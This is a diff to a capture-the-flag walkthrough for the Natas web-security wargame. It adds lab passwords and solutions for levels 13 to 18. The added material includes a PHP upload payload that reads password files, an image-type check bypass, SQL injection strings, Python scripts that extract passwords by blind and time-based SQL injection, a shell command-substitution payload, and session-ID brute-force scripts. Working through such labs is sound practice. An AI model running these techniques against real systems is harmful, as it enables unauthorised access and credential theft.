@@ -13,6 +13,17 @@ http://natasX.natas.labs.overthewire.org
 11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+
+
+
+
 
 0: View the source code of the web page and it's there as a comment.
 
@@ -159,14 +170,14 @@ a.php. Then create a file "test" with contents,
 echo "hello";
 
 Uploading the file and clicking the created link we see the file was
-executed as a php file. Changing the contents of "test" to
+executed as a php file. Change the contents of "test" to
 
 <?php
 
 $file=file_get_contents("/etc/natas_webpass/natas13");
 echo $file;
 
-Uploading the file and clicking the link gets the password.
+Then uploading the file and clicking the link gets the password.
 
 alternatively could use,
 
@@ -174,7 +185,242 @@ alternatively could use,
 $output = shell_exec("cat /etc/natas_webpass/natas13");
 echo "<pre>$output</pre>";
 
-shell_exec allows other types of commands to be executed on the 
-servers system.
+13: For this level we exploit the weakness of the php exif_imagetype()
+function. It checks the beginning of the file for a file type signature
+also known as a magic number. By placing the magic number for a jpeg
+at the beginning of the previous php file used in level 12, we can
+fool the exif_imagetype() into allowing us to upload our file. Then
+we aquire the password in the same way as in level 12. 
+ 
+14: Looking at the source code we can see you that user input is used
+to craft a sql query. If the query returns a non zero result set the 
+password is given. As user input is directly used to create the query
+without being sanitized at all, the level is vulnerable to sql injection.
+
+Setting the username as:
+
+" or 1=1;#
+
+the sql query becomes,
+ 
+"SELECT * from users where username="" or1=1".
+
+The semi colon ends the php code and the # comments out the rest of the
+line.
+
+15: Again the level is susceptible to sql injection. We can alter the 
+sql query to glean information about the password, although now it
+doesn't instantly give it to us in full. If the query returns a non
+zero number of rows, then we are told the user exists. The sql query
+begins with "select * from user where username=\"". The php function
+mysql_query() will only execute one query, so we cannot add on extra
+queries using ";". This means we are limited to altering the select query.
+By adding on the string
+
+	natas16" and LENGTH(password)=1#
+
+we can deduce that the password is not of length 1. By experimentation
+with the length we deduce that the length of the password is 32. The
+same length as the previous passwords. To help work out the password we
+can use the string,  
+ 	
+natas16" and password LIKE BINARY 's%'#
+
+where we vary s. This string will check whether the password starts with
+the string s. If we get the message that the user exists, then we know the
+password begins with s. We can then search for its second character, then 
+third etc. The sql key word BINARY is necessary to ensure we differentiate 
+between upper and lower case. I used the following python script to check 
+each character and build up the password.
+
+
+wrote this script. 
+
+import urllib2, urllib, base64
+
+#create characters I'm going to loop through.
+characters='abcdefghijklmnopqrstuvwxyz'
+characters+=characters.upper()
+characters+='0123456789'
+
+#function to find password.
+def get_password():
+    
+    #with each loop we'll add the password characters we know
+    #to the beginning of the search character.
+    string_start=''
+    for i in range(32):    
+        for character in characters:
+            
+            #The string we want to check whether the password begins with.
+            string="'"+string_start+character+"%'"
+            
+            #Connect to the web page, send username and password, then
+	      #send our query as a parameter when we open the url.
+	    
+            request = urllib2.Request("http://natas15.natas.labs.overthewire.org/index.php")
+            base64string = base64.encodestring('%s:%s' % ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')).replace('\n', '')
+            request.add_header("Authorization", "Basic %s" % base64string)   
+            params=urllib.urlencode({'username':'natas16" and password LIKE BINARY'+string+'#'})
+            result = urllib2.urlopen(request,params)
+            
+            #Read the response, keep the important part, which we can use
+	      #to test whether the character is the one we want. If it
+	      #is then start looking for the next character. This continues
+            #until we have them all.		 
+	      
+            text=result.readlines()
+            decider=text[13].split('.')[0].split()[2]
+            if decider=='exists':
+                print character
+                string_start+=character
+                break
+    print string_start                    
+            
+get_password()            
+
+16: Now we cannot use [;|'"]. However we can pass the grep command a variable
+of the form $(x) where x is some command not containing the illegal characters.
+Using this fact we can glean some information about the password in a similar
+way to the previous level. Using the string,
+
+$(grep -E ^s /etc/natas_webpass/natas17)African
+
+we can determine whether the password begins with s. The -E tells grep to
+treat ^s as a regular expression without the need for the quotation marks.
+
+I used the following python script, which is a slight modification of the
+previous one.
+
+import urllib2, urllib, base64
+
+#function to find password.
+def get_password():
+    
+    #create characters I'm going to loop through.
+    characters='abcdefghijklmnopqrstuvwxyz'
+    characters+=characters.upper()
+    characters+='0123456789'
+    
+    #with each loop we'll add the password characters we know
+    #to the beginning of the search character.
+    string_start=''
+    for i in range(32):    
+         for character in characters:
+            
+            #The string we want to check whether the password begins with.
+            string=string_start+character
+            
+            #Connect to the web page, send username and password, then
+	      #send our query as a parameter when we open the url.
+	    
+            request = urllib2.Request("http://natas16.natas.labs.overthewire.org/index.php")
+            base64string = base64.encodestring('%s:%s' % ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).replace('\n', '')
+            request.add_header("Authorization", "Basic %s" % base64string)   
+            params=urllib.urlencode({'needle':'$(grep -E ^'+string+' /etc/natas_webpass/natas17)African'})
+            result = urllib2.urlopen(request,params)
+            
+            #Read the response, keep the important part, which we can use
+	      #to test whether the character is the one we want.
+	      
+            text=result.readlines()
+            if text[22].strip()!='African':
+                print 'found: '+character
+                string_start+=character
+                break
+            
+    print string_start                    
+            
+get_password()            
+
+17: We will craft a sql string which will force the server to sleep for a
+set number of seconds if the query evaluates to true. This delay will indicate
+whether we have picked the correct character. By looping through all 
+characters we will slowly build the password. The sql string we will use is,
+
+natas18"-IF(username="natas18" and password LIKE BINARY+"s%",SLEEP(3),0);#
+
+This will cause a 3 second delay if the password starts with s.
+
+I used the following python script to get the whole password.
+
+import urllib2, urllib, base64, timeit
+
+
+
+#function to find password.
+def get_password():
+    
+    #create characters I'm going to loop through.
+   characters='abcdefghijklmnopqrstuvwxyz'
+   characters+=characters.upper()
+   characters+='0123456789'
+   starts_with=''
+   for i in range(32):
+       for character in characters: 
+           string=starts_with+character+'%'
+                
+        #Connect to the web page, send username and password, then
+        #send our query as a parameter when we open the url.
+    	    
+           request = urllib2.Request("http://natas17.natas.labs.overthewire.org/index.php")
+           base64string = base64.encodestring('%s:%s' % ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')).replace('\n', '')
+           request.add_header("Authorization", "Basic %s" % base64string)   
+           params=urllib.urlencode({'username':'natas18"-IF(username="natas18" and password LIKE BINARY+"'+string+'",SLEEP(3),0);#'})
+
+           #Time how long it takes the server to respond, if greater than 3 seconds
+           #then assume sql statement has evaluated to true and so we have the right character.      
+       
+           start=timeit.default_timer()   
+           result = urllib2.urlopen(request,params)
+           finish=timeit.default_timer()-start        
+           if finish > 3:
+               print character
+               result.close()
+               starts_with+=character            
+               break
+           result.close()
+       
+            
+   print starts_with         
+                        
+            
+get_password()            
+
+18: Reading the source code we see that a session id is created using the 
+function call rand(1,$maxid) where $maxid has value 640. This id is stored as
+cookie. By sending the id that corresponds to the admin we'll be logged in
+as the admin. As there are only 640 possible ids we can write a script to
+loop through each possibility. We do this with the following python script,
+
+import requests
+ 
+for sessid in range(641): 
+    r = requests.get('http://natas18.natas.labs.overthewire.org',
+        auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
+        cookies={'PHPSESSID':str(sessid)})
+    if "You are logged in as a regular user." not in r.content:
+        print r.content, sessid
+        break
+
+or alternatively the bash script,
+
+#!/bin/bash
+
+for i in `seq 1 640`;
+do
+    res1=$( curl -s -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/ --cookie PHPSESSID=$i)
+    res2=$(echo $res1|grep 'You are logged in as a regular user' )
+    # Echo the result of the curl if
+    # 'you are logged in as a regular user' is not in it
+    # -z option checks for empty string. 
+    if [ -z "$res2" ];
+    then
+               echo $res1
+               break
+    fi
+    echo $i
+done
+
 
 
